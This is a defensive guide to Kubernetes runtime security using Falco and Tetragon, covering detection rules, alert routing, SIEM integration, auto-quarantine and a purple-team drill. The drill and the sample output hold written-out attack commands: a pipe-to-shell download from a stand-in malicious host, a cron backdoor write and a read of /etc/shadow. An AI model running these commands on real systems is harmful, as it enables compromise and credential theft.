---
description: "The modern way to detect bad behavior at runtime in Kubernetes: Falco (rule-based), Tetragon (eBPF native), and setting up the chain from alert to action."
tags:
  - Security
  - Kubernetes
  - Observability
  - Incident Response
---
# Runtime Security — Falco, Tetragon, eBPF

> *"Build-time scanning builds the wall; runtime detection is the **alarm-sounding
> detector**. Without both, the moment you find out about a breach is your
> customer's tweet."*

This guide shows the modern way to detect bad behavior at runtime in a
Kubernetes cluster: Falco (rule-based), Tetragon (eBPF native), and how to
build the alarm → action chain.

---

## 🎯 Why Do You Need Runtime Security?

```
       │
   ┌───▼────┐                         ┌──────────┐
   │ Build  │  CVE-free, signed image │ Admission│  Verify, deploy.
   │  scan  │  →→→→→→→→→→→→→→→→→→→→→→ │  policy  │
   └────────┘                         └────┬─────┘
                                           │
                                           ▼
                                  ┌─────────────────┐
                                  │   Pod running   │
                                  │                 │
                                  │  What's the     │  ← this is the blind spot
                                  │  container doing?│
                                  └─────────────────┘
                                           │
                                  Runtime detection
                                  Falco / Tetragon
                                  ▼
                              Alert + auto-response
```

Even an image that has passed build-time scans can **behave badly at runtime**:
- Compromised dependency (npm package supply-chain attack)
- Zero-day exploitation
- Insider script
- Lateral movement (compromised pod → others)

> 🔑 **Practical rule:** Every hour you run a production cluster **without
> detection** is time that passes **unseen** in the event of a breach.

---

## ⚖️ Falco vs Tetragon

| Feature | **Falco** | **Tetragon** |
|---|---|---|
| **Type** | Rule-based runtime detector | eBPF native observability + enforcement |
| **Data source** | Kernel events (syscalls, k8s audit) | eBPF programs (raw kernel) |
| **Age** | 2016 (CNCF Graduated) | 2022 (CNCF Incubating, Cilium ecosystem) |
| **Performance** | Good, but syscall hooking has a cost | Excellent, eBPF low overhead |
| **Enforcement** | Detect only, alert | Detect + **kill / block** (eBPF in-kernel) |
| **Setup** | DaemonSet | DaemonSet, integrated if Cilium is present |
| **Rule DSL** | YAML + custom expression | TracingPolicy (CRD) |
| **Community** | Wide, mature rule catalogs | New, active Cilium team |
| **Best for** | Fast start, lots of ready-made rules | You use Cilium, performance-critical |

> 🔑 **Practical advice:** Falco has a low learning curve, a wide library —
> **start here for most organizations**. Use Tetragon if you run Cilium or
> your scale is very large. You can also run both together (overlap is acceptable).

---

## 🛠️ Installing Falco

```bash
helm install falco falcosecurity/falco \
  -n falco --create-namespace \
  --set driver.kind=modern_ebpf \
  --set tty=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set falcoctl.config.indexes[0].name=falcosecurity \
  --set falcoctl.config.indexes[0].url=https://falcosecurity.github.io/falcoctl/index.yaml
```

**Driver selection:**
- ✅ `modern_ebpf` (kernel 5.8+) — recommended
- ⚠️ `ebpf` (legacy eBPF) — fallback
- ❌ `kernel module` — per-kernel compilation, don't use it

### Falco-sidekick: alert routing
Falco raises alarms → falco-sidekick → Slack/PagerDuty/SIEM/Webhook.

```yaml
# values.yaml (sidekick)
falcosidekick:
  config:
    slack:
      webhookurl: "https://hooks.slack.com/services/<...>"
      channel: "#security-alerts"
      minimumpriority: warning
    pagerduty:
      routingkey: "<KEY>"
      minimumpriority: critical
    elasticsearch:
      hostport: "https://<ES_HOST>:9200"
      index: falco
```

---

## 📜 Falco Rule Anatomy

### Built-in example
```yaml
- rule: Terminal shell in container
  desc: An interactive shell was started inside the container
  condition: >
    spawned_process and container
    and shell_procs and proc.tty != 0
    and container_entrypoint
    and not user_expected_terminal_shell_in_container_conditions
  output: >
    A shell was spawned in a container with an attached terminal
    (user=%user.name container=%container.name image=%container.image.repository
     proc=%proc.name parent=%proc.pname cmdline=%proc.cmdline)
  priority: NOTICE
  tags: [container, shell, mitre_execution]
```

### Writing a custom rule
```yaml
# /etc/falco/rules.d/custom-rules.yaml

- rule: Outbound connection to unexpected destination
  desc: Container is talking to an unexpected IP on the internet
  condition: >
    outbound and container
    and not fd.sip in (allowed_outbound_ips)
    and not fd.sip in (k8s_dns_servers)
  output: >
    Suspicious outbound connection (container=%container.name
     dest_ip=%fd.sip dest_port=%fd.sport)
  priority: WARNING
  tags: [network, mitre_command_and_control]


- list: allowed_outbound_ips
  items: ["10.0.0.0/8", "172.16.0.0/12"]


- rule: Write to /etc in container
  desc: Writing to /etc inside the container is anomalous
  condition: >
    open_write and container
    and fd.name startswith /etc
    and not proc.name in (allowed_etc_writers)
  output: >
    Write to /etc detected (container=%container.name
     file=%fd.name proc=%proc.name)
  priority: ERROR
  tags: [filesystem, mitre_persistence]
```

---

## 🚨 "Day One" Alarm Set

As soon as you're in a production cluster, the following alarms must be enabled **in the first week**:

| Alarm | Threat |
|---|---|
| Shell in container | Attacker is running exec |
| Write below /etc | Persistence mechanism |
| Read sensitive file (`/etc/shadow`, `/etc/kubernetes/admin.conf`) | Credential dump |
| Privileged operation by non-admin | Privilege escalation |
| Outbound to suspicious IP | C2 callback |
| Container drift (image hash changed) | Image substitution |
| K8s ServiceAccount token mounted in unexpected pod | Lateral movement |
| Kubectl exec from outside | Insider abuse |
| Cryptomining process (xmrig, ccminer signatures) | Resource abuse |
| Reverse shell pattern | Command injection |

### MITRE ATT&CK mapping
Add a `mitre_*` tag to every rule → report by tactic/technique in the SIEM:
```yaml
tags: [container, shell, mitre_execution, T1059]
```

---

## 🛡️ Tetragon — Detect + Enforce with eBPF

### Installation
```bash
helm install cilium cilium/cilium \
  -n kube-system \
  --set tetragon.enabled=true

# or standalone
helm install tetragon cilium/tetragon \
  -n kube-system
```

### TracingPolicy: killing a shell process
```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: kill-shells-in-prod
spec:
  kprobes:
    - call: "sys_execve"
      syscall: true
      args:
        - index: 0
          type: "string"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Equal"
              values:
                - "/bin/bash"
                - "/bin/sh"
                - "/bin/zsh"
          matchActions:
            - action: Sigkill
```

> 🔑 Tetragon can **kill** — it sends SIGKILL in kernel-space, the syscall
> never completes. Falco only reports.

### Observing the process tree
```bash
kubectl exec -n kube-system <TETRAGON_POD> -c tetragon -- \
  tetra getevents -o compact

# Output:
# 🚀 process default/api-pod /usr/bin/curl http://malicious.com/payload
# 🛑 sigkill default/api-pod /usr/bin/curl http://malicious.com/payload
```

---

## 🔄 Detection → Response Automation

### Falco → Falcosidekick → Action
```yaml
# falcosidekick config
outputs:
  - type: webhook
    url: "https://<RESPONSE_API>/quarantine-pod"
    minimumpriority: critical
```

### Response service (example): isolate the pod from the network
```python
# response-service.py (FastAPI)
from fastapi import FastAPI
from kubernetes import client, config

config.load_incluster_config()
app = FastAPI()

@app.post("/quarantine-pod")
def quarantine(alert: dict):
    pod = alert["output_fields"]["k8s.pod.name"]
    namespace = alert["output_fields"]["k8s.ns.name"]

    # Add quarantine label to the pod
    api = client.CoreV1Api()
    body = {"metadata": {"labels": {"quarantine": "true"}}}
    api.patch_namespaced_pod(pod, namespace, body)

    # A separate NetworkPolicy isolates this label from all traffic
    return {"status": "quarantined", "pod": pod}
```

### Quarantine NetworkPolicy
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantined-pods
  namespace: <NS>
spec:
  podSelector:
    matchLabels:
      quarantine: "true"
  policyTypes: [Ingress, Egress]
  # no ingress / egress → all traffic is blocked
```

> ⚠️ **Be careful with auto-response:** False positive → risk of taking down
> a prod service. Go gradual: ALERT only at first, "soft action" (label) after
> 1 month, aggressive action (kill pod) after 3 months.

---

## 📊 SIEM Integration

Falco/Tetragon events **must always** go to centralized logging:

| SIEM / Log | Output plugin |
|---|---|
| Wazuh | Falcosidekick syslog plugin |
| Loki + Grafana | Falcosidekick loki plugin |
| Splunk | HTTP Event Collector (HEC) |
| Elastic | Elasticsearch output |
| Datadog | Datadog API |
| Sumo Logic | HTTP webhook |

### Integration with Wazuh (common in Turkey)
```yaml
# falcosidekick values
falcosidekick:
  config:
    syslog:
      host: "<WAZUH_MANAGER>"
      port: 514
      protocol: tcp
      format: json
```

```xml
<!-- /var/ossec/etc/decoders.d/falco_decoders.xml -->
<decoder name="falco">
  <prematch>^{"output":</prematch>
  <plugin_decoder>JSON_Decoder</plugin_decoder>
</decoder>
```

See: [`Network/Network Segmentation and Wazuh SIEM Integration Guide.md`](../21-Field-Notes/network/network-segmentation-wazuh-siem.md).

---

## 📈 Measurement: Detection Effectiveness

### KPIs
| Metric | Target |
|---|---|
| MTTD (Mean Time To Detect) | < 5 minutes |
| False positive rate | < 5% |
| Coverage (MITRE technique) | 70%+ critical techniques |
| Alert volume | < 10/day/cluster (so a human can review) |
| Drill (purple team) frequency | Quarterly |

### Detection coverage matrix
Map the Falco rule for every MITRE ATT&CK technique:

| Tactic | Technique | Rule |
|---|---|---|
| Initial Access | T1190 (exploit public app) | "Suspicious outbound" |
| Execution | T1059 (command interpreter) | "Shell in container" |
| Persistence | T1505 (server software comp.) | "Write below /etc" |
| Privilege Escalation | T1068 (kernel exploit) | "Setuid file accessed" |
| Defense Evasion | T1140 (deobfuscate) | "Base64 + curl pattern" |
| Credential Access | T1003 (OS creds) | "Read /etc/shadow" |
| Discovery | T1018 (remote system) | "kubectl get nodes from pod" |
| Lateral Movement | T1021 (remote services) | "SSH from container" |
| Exfiltration | T1041 (C2 channel) | "Outbound to non-internal IP" |

---

## 🚫 Anti-Pattern Table

| Anti-pattern | Why it's bad | Correct |
|---|---|---|
| Only install Falco, no custom rules | Default rules aren't enough | 10+ custom rules in the first week |
| Alerts go only to Slack | Volume grows, the team starts ignoring it | Route to SIEM + dedup + severity routing |
| Auto-response is aggressive from day one | False positive takes down prod | Gradual: Alert → Label → Kill |
| `priority: ERROR` for everything | What matters gets lost | Separate NOTICE / WARN / ERROR / CRITICAL |
| No MITRE mapping | Coverage gaps stay invisible | Every rule tied to a MITRE technique |
| Falco crashes, nobody notices | Detection dies silently | Falco itself is monitored |
| No Falco in test/CI | New features introduce unintended patterns | Keep Falco active in E2E tests too |
| No drills | "It works" is just an assumption | Quarterly purple team drill |

---

## 🎯 Drill: Purple Team Drill

### Scenario: "Compromised pod"
```bash
# Red team (attack simulation)
kubectl exec -it <POD> -- /bin/bash
# inside:
curl http://malicious.com/payload | sh
echo "evil" > /etc/cron.daily/backdoor
cat /etc/shadow
```

### Expected alarms (Falco)
- ✅ "Shell in container"
- ✅ "Suspicious outbound"
- ✅ "Write below /etc"
- ✅ "Read sensitive file"

### Score
- Which alarms fired?
- MTTD?
- Did it trigger the IC process?
- What additional control is needed?

> Quarterly drills → close a gap every time, sharpen the team's reflexes.

---

## 📋 Runtime Security Checklist

```
[ ] Falco or Tetragon (or both) installed on all clusters
[ ] modern_ebpf driver (kernel 5.8+)
[ ] Falcosidekick → SIEM (Wazuh / Loki / Splunk)
[ ] 10+ custom rules in the first week (from the list above)
[ ] MITRE ATT&CK mapping done
[ ] Severity routing: WARN → Slack, ERROR → Slack + ticket, CRITICAL → PagerDuty
[ ] False positive < 5%, alert hygiene quarterly review
[ ] Auto-response policy: gradual (Alert → Label → Kill)
[ ] Quarantine NetworkPolicy ready
[ ] Quarterly purple team drill
[ ] MTTD measured, target < 5 min
[ ] Falco/Tetragon's own pods are monitored (meta-monitoring)
[ ] Falco active in CI/E2E test environment (catch regressions)
[ ] Coverage matrix up to date (MITRE technique x rule)
```

---

## 📚 References

- **Falco** — falco.org
- **Falco Rules Repository** — github.com/falcosecurity/rules
- **Falcosidekick** — github.com/falcosecurity/falcosidekick
- **Tetragon** — tetragon.io
- **eBPF.io** — ebpf.io
- **MITRE ATT&CK for Containers** — attack.mitre.org/matrices/enterprise/containers/
- [`Kubernetes-Hardening.md`](Kubernetes-Hardening.md)
- [`Threat-Modeling.md`](Threat-Modeling.md) — owns the coverage matrix
- [`11-SRE/Incident-Response.md`](../11-SRE/Incident-Response.md) — alert → IR flow
- [`Network/Network Segmentation and Wazuh SIEM Integration Guide.md`](../21-Field-Notes/network/network-segmentation-wazuh-siem.md)

---

> *"Build builds the wall; runtime **rings the doorbell**. The attacker
> eventually gets past the wall; if the doorbell doesn't ring, it means
> you're waiting for **your customer's tweet** to find out you've been breached."*
